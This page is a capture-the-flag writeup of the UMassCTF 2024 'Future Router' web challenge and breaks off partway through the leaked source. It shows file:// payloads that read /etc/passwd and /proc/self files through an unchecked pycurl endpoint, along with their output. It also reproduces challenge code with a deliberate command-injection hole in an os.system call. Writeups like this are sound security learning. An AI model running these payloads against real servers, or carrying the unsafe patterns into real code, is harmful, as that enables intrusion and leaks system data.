<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Faf7d66d0-6402-4a6f-b9f5-00d2eb9e3482%2Fhackerman.gif?table=collection&amp;id=92e319e1-0c5e-49c7-adc1-7d48fe74e022">

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>Future Router - UMassCTF 2024 Writeup&nbsp;|&nbsp;samiko@127.0.0.1~$</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="Future Router - UMassCTF 2024 Writeup">
  
    <meta name="description" content="A web category challenge which involves chaining an arbitrary file read vulnerability in a cURL utility with a command injection vulnerability on a WebSocket-based customer service agent.">
    <meta property="og:description" content="A web category challenge which involves chaining an arbitrary file read vulnerability in a cURL utility with a command injection vulnerability on a WebSocket-based customer service agent.">
  
  
    <meta property="og:image" content="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;üì°&lt;/text&gt;&lt;/svg&gt;">
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="/">
    <div class="Navbar__Btn">
      
        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Faf7d66d0-6402-4a6f-b9f5-00d2eb9e3482%2Fhackerman.gif?table=collection&amp;id=92e319e1-0c5e-49c7-adc1-7d48fe74e022"></span>&nbsp;
      
      <span>Home</span>
    </div>
  </a>
  
</nav>
  <header class="Header">
    
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
      <div class="Header__Icon">
        <span><img class="inline-img-icon" src="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;üì°&lt;/text&gt;&lt;/svg&gt;"></span>
      </div>
    
    <h1 class="Header__Title">Future Router - UMassCTF 2024 Writeup</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Mon, Apr 22, 2024</span>
        
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
            <a href="tag/UMassCTF&#39;24">UMassCTF&#39;24</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
            <a href="tag/Web_Application">Web Application</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
            <a href="tag/Command_Injection">Command Injection</a>
          </span>
        
      </div>
      <div>
        A web category challenge which involves chaining an arbitrary file read vulnerability in a cURL utility with a command injection vulnerability on a WebSocket-based customer service agent.
      </div>
    
  </header>
  <article id="https://www.notion.so/16addf503e5e453e907292bb033fda3f" class="PageRoot"><h3 id="https://www.notion.so/434cecdfd75047bbb46e859f2a0cc095" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/434cecdfd75047bbb46e859f2a0cc095"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Preface</span></span></h3><div id="https://www.notion.so/a436aef1d10c4ea5b342021be61c2092" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This weekend, I participated in UMassCTF 2024 with my team AdelaideB9 where we placed 41st out of 417 teams. The challenges were generally quite well made and my favourite challenge was a web challenge by the name of ‚ÄúFuture Router‚Äù. This challenge involves chaining together an arbitrary file read vulnerability in a cURL utility to extract the application source code, then a command injection vulnerability on a WebSocket-based customer service agent to gain RCE on the server, which I found to be quite unique.</span></span></p></div><h3 id="https://www.notion.so/bb31f4a11f8844e2a0426f53ee4f3b4f" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/bb31f4a11f8844e2a0426f53ee4f3b4f"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Challenge description</span></span></h3><div id="https://www.notion.so/04402d6fb6b64fe896fcf965e02903d5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Mr. Krabs just got a brand new router in the mail for him to use in the Krusty Krab. There was no mailing address so he&#x27;s tasked you with figuring out where the router is from and finding a flag!</span></span></p></div><div id="https://www.notion.so/4bf093d242fd4200834779a4e7955399" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Note: Please do not run brute forcing or directory busting tools on this challenge. It won&#x27;t help you get a solve.</span></span></p></div><div id="https://www.notion.so/543eae35b53a4601a0edf4cd3ac2cef2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://future-router.ctf.umasscybersec.org/">http://future-router.ctf.umasscybersec.org</a></span></span></p></div><h3 id="https://www.notion.so/ab2e1a25784a43619c56e27d0b60f76e" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/ab2e1a25784a43619c56e27d0b60f76e"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Arbitrary File Read in cURL endpoint</span></span></h3><div id="https://www.notion.so/55c62f058cac4f70826a9ebb9b8d7191" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Upon visiting the site, we are able to access four pages: the index page at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/</code></span><span class="SemanticString">, the dashboard at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/dash</code></span><span class="SemanticString">, a cURL tool at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/cURL</code></span><span class="SemanticString">, and a customer service page at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/customerservice</code></span><span class="SemanticString">. We‚Äôll focus on the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/cURL</code></span><span class="SemanticString"> endpoint first. Depending on how the web application calls the cURL program and how user input is handled, a tool like this may introduce critical vulnerabilities such as command injection.</span></span></p></div><div id="https://www.notion.so/920c41617dec43639d2f59d7c2b12506" class="Image Image--PageWidth"><figure><a href="https://i.imgur.com/ndVLIPG.png?width=708"><img src="https://i.imgur.com/ndVLIPG.png?width=708" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/dbdf685d7b934276a693e95ab80a997b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The page says we can only cURL devices on the network, so it‚Äôs unlikely we‚Äôll be able to inject data remotely. We‚Äôll use Burp Suite Proxy to intercept the request, then send it to Repeater to investigate further:</span></span></p></div><div id="https://www.notion.so/35ce5aac36b9432f8fa3f6883522324c" class="Image Image--PageWidth"><figure><a href="https://i.imgur.com/nTK8NJA.png?width=708"><img src="https://i.imgur.com/nTK8NJA.png?width=708" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/22cd9dd516504b96ae43cc74f7d4324c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After trying many injection characters (e.g. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">;</code></span><span class="SemanticString"> </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&amp;&amp;</code></span><span class="SemanticString"> </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">|</code></span><span class="SemanticString">) which came up with nothing, we tried different wrappers and came across the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file://</code></span><span class="SemanticString"> wrapper:</span></span></p></div><div id="https://www.notion.so/bec4d13a0870451e802399f9a043c60a" class="Image Image--PageWidth"><figure><a href="https://i.imgur.com/U98eayD.png?width=1050"><img src="https://i.imgur.com/U98eayD.png?width=1050" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/24e4d03545c046c5bdddc918d4fb9468" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">By supplying </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file:///etc/passwd</code></span><span class="SemanticString"> as the URL, we were able to read the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passwd</code></span><span class="SemanticString"> file on the server. This reveals a user of ID 1337 called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sheldonjplankton</code></span><span class="SemanticString">. Unfortunately, this user‚Äôs home folder does not exist and the flag is nowhere to be found.</span></span></p></div><div id="https://www.notion.so/bf6a2344f4234186baf3d537cfd0a609" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We can use this technique to read a number of files, specifically pseudo-files in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/proc/self</code></span><span class="SemanticString"> to get more information about the current process:</span></span></p></div><div id="https://www.notion.so/e370d93bfe3e45bb9309b263183c82ce" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file:///proc/self/environ</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/589eeac2687d443e93ec5bbfa1808bf0" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>OLDPWD=/\u0000PWD=/planktonsrouter1ba8b69e\u0000</span></span></span></code></pre><div id="https://www.notion.so/c9d6db36380c47a987051f90f16a2624" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file:///proc/self/cmdline</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/45ad0f3142ce48c19a0c51fee961c9ea" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>/usr/local/bin/python\u0000/usr/local/bin/gunicorn\u0000-w\u00004\u0000--bind\u00000.0.0.0:8000\u0000app:app\u0000</span></span></span></code></pre><div id="https://www.notion.so/40420e276072411aaa0f6521fe56d9fa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We now know that the server is being hosted by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gunicorn</code></span><span class="SemanticString"> as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">app:app</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/planktonsrouter1ba8b69e</code></span><span class="SemanticString"> is possibly the path where the application files are stored. Using these pieces of information, we make an educated guess that the source code is likely located in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/planktonsrouter1ba8b69e/app.py</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/0d553e4ae62048419ead3cdddd48dcc5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file:///planktonsrouter1ba8b69e/app.py</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/d4a36458fe274ea5a1c1ba40350a4c7a" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> blueprints<span class="token punctuation">.</span>routes <span class="token keyword">import</span> httpserver

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token comment"># This web server is the property of Sheldon J. Plankton, </span>
<span class="token comment"># please refrain from reading this secret source code.</span>
<span class="token comment"># I WILL USE THIS ROUTER TO STEAL THE SECRET KRABBY PATTY FORMULA!</span>
app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>httpserver<span class="token punctuation">,</span> url_prefix<span class="token operator">=</span><span class="token string">'/'</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/4f0f2a1bcc924599bc905e2157741832" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We were able to get the Python source of the application, which imports </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">blueprints.routes</code></span><span class="SemanticString">, so let‚Äôs read that file:</span></span></p></div><div id="https://www.notion.so/95b0cabe14b04121ba319227e9701763" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file:///planktonsrouter1ba8b69e/blueprints/routes.py</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/8af656b3efe74b5c8ead3a09cf0b5531" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> Blueprint<span class="token punctuation">,</span>send_from_directory
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
<span class="token keyword">import</span> pycurl 

httpserver <span class="token operator">=</span> Blueprint<span class="token punctuation">(</span><span class="token string">'httpserver'</span><span class="token punctuation">,</span> __name__<span class="token punctuation">)</span>

<span class="token comment">#@httpserver.route("/docs",methods=["GET"])</span>
<span class="token comment">#def docs():</span>
<span class="token comment">#   return """&lt;!doctype html></span>
<span class="token comment">#    &lt;h1>Router Docs&lt;/h1></span>
<span class="token comment">#</span>
<span class="token comment">#    &lt;h2>Websocket API&lt;/h2></span>
<span class="token comment">#</span>
<span class="token comment">#    &lt;strong>TODO: Document how to talk to </span>
<span class="token comment">#   Karen's customer service module in ../karen/customerservice.py</span>
<span class="token comment">#   Also figure out how to use supervisord better.&lt;/strong></span>
<span class="token comment">#"""</span>
<span class="token comment">#</span>
<span class="token comment"># Securely CURL URLs, absolutely no bugs here!</span>

<span class="token decorator annotation punctuation">@httpserver<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/static/&lt;path:path>"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">,</span>path<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@httpserver<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/cURL"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'curl.html'</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token builtin">buffer</span> <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
            c <span class="token operator">=</span> pycurl<span class="token punctuation">.</span>Curl<span class="token punctuation">(</span><span class="token punctuation">)</span>
            c<span class="token punctuation">.</span>setopt<span class="token punctuation">(</span>c<span class="token punctuation">.</span>URL<span class="token punctuation">,</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'URL'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            c<span class="token punctuation">.</span>setopt<span class="token punctuation">(</span>c<span class="token punctuation">.</span>WRITEDATA<span class="token punctuation">,</span> <span class="token builtin">buffer</span><span class="token punctuation">)</span>
            c<span class="token punctuation">.</span>perform<span class="token punctuation">(</span><span class="token punctuation">)</span>
            c<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            DATA <span class="token operator">=</span> <span class="token builtin">buffer</span><span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">"success"</span><span class="token punctuation">:</span>DATA<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>with_traceback<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>

<span class="token decorator annotation punctuation">@httpserver<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/customerservice"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">customerservice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'customerservice.html'</span><span class="token punctuation">)</span>

NETWORK <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span><span class="token string">'hostname'</span><span class="token punctuation">:</span><span class="token string">'patricks-rock'</span><span class="token punctuation">,</span><span class="token string">'ports'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">'service'</span><span class="token punctuation">:</span><span class="token string">'http'</span><span class="token punctuation">,</span><span class="token string">'num'</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">'hostname'</span><span class="token punctuation">:</span><span class="token string">'spongebobs-spatula'</span><span class="token punctuation">,</span><span class="token string">'ports'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">'service'</span><span class="token punctuation">:</span><span class="token string">'http'</span><span class="token punctuation">,</span><span class="token string">'num'</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">'hostname'</span><span class="token punctuation">:</span><span class="token string">'squidwards-clarinet'</span><span class="token punctuation">,</span><span class="token string">'ports'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">'service'</span><span class="token punctuation">:</span><span class="token string">'http'</span><span class="token punctuation">,</span><span class="token string">'num'</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span>

<span class="token punctuation">]</span>
<span class="token decorator annotation punctuation">@httpserver<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/dash"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">dash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'dashboard.html'</span><span class="token punctuation">,</span>network<span class="token operator">=</span>NETWORK<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@httpserver<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/4d0c3ac851114bf8a52af2dbb48674f5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We‚Äôve now got the source code for the application‚Äôs routes. There is a commented </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/docs</code></span><span class="SemanticString"> route which mentions that Karen‚Äôs customer service module is in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">../karen/customerservice.py</code></span><span class="SemanticString">, let‚Äôs get that file too:</span></span></p></div><div id="https://www.notion.so/5b5cd6b1b41641ab8b1a1007340041ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file:///planktonsrouter1ba8b69e/karen/customerservice.py</code></span></span></p></div><pre id="https://www.notion.so/7427f034f108407b952d7bb331c3dc98" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">import</span> asyncio<span class="token punctuation">,</span> os<span class="token punctuation">,</span> re
<span class="token keyword">from</span> websockets<span class="token punctuation">.</span>server <span class="token keyword">import</span> serve

<span class="token comment"># Due to security concerns, I, Sheldon J. Plankton have ensured this module</span>
<span class="token comment"># has no access to any internet service other than those that are</span>
<span class="token comment"># trusted. This agent will trick Krabs into sending me the secret</span>
<span class="token comment"># krabby patty formula which I will log into Karen's secret krabby patty </span>
<span class="token comment"># secret formula file! First, I have to fix a few security bugs!</span>
<span class="token keyword">class</span> <span class="token class-name">KarenCustomerServiceAgent</span><span class="token punctuation">:</span>
    SECRET_KEY <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token string">b"\xe1\x86\xb2\xa0_\x83B\xad\xd7\xaf\x87f\x1e\xb4\xcc\xbf...i will have the secret krabby patty formula."</span><span class="token punctuation">)</span>
    Dialogue <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">"Welcome"</span><span class="token punctuation">:</span><span class="token string">"Hello! Welcome to the Future Router service bot!"</span><span class="token punctuation">,</span>
        <span class="token string">"Secret formula"</span><span class="token punctuation">:</span><span class="token string">"Thank you for your input, we will process your request in 1-3 business days"</span><span class="token punctuation">,</span>
        <span class="token string">"Problem"</span><span class="token punctuation">:</span><span class="token string">"Are you having an issue? Please enter the secret krabby patty formula in the dialogue box to continue"</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">def</span> <span class="token function">handle_input</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"hello"</span> <span class="token keyword">in</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>Dialogue<span class="token punctuation">[</span><span class="token string">"Welcome"</span><span class="token punctuation">]</span>
        <span class="token keyword">elif</span><span class="token punctuation">(</span><span class="token string">"krabby patty"</span> <span class="token keyword">in</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>
            filtered_message <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r"(\"|\'|\;|\&amp;|\|)"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span>message<span class="token punctuation">)</span>
            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'echo "</span><span class="token interpolation"><span class="token punctuation">{</span>filtered_message<span class="token punctuation">}</span></span><span class="token string">\n" >> /dev/null'</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>Dialogue<span class="token punctuation">[</span><span class="token string">"Secret formula"</span><span class="token punctuation">]</span>
        <span class="token keyword">elif</span><span class="token punctuation">(</span><span class="token string">"problem"</span> <span class="token keyword">in</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>Dialogue<span class="token punctuation">[</span><span class="token string">"Problem"</span><span class="token punctuation">]</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"I could not understand your message, this agent is under construction. Please use the other implemented features for now!"</span>
    <span class="token keyword">def</span> <span class="token function">xor_decrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">:</span>
        plaintext <span class="token operator">=</span> <span class="token string">""</span>
        cipher_arr <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher_arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            plaintext <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>cipher_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>SECRET_KEY<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>SECRET_KEY<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> plaintext

KarenAgent <span class="token operator">=</span> KarenCustomerServiceAgent<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">respond</span><span class="token punctuation">(</span>websocket<span class="token punctuation">)</span><span class="token punctuation">:</span>
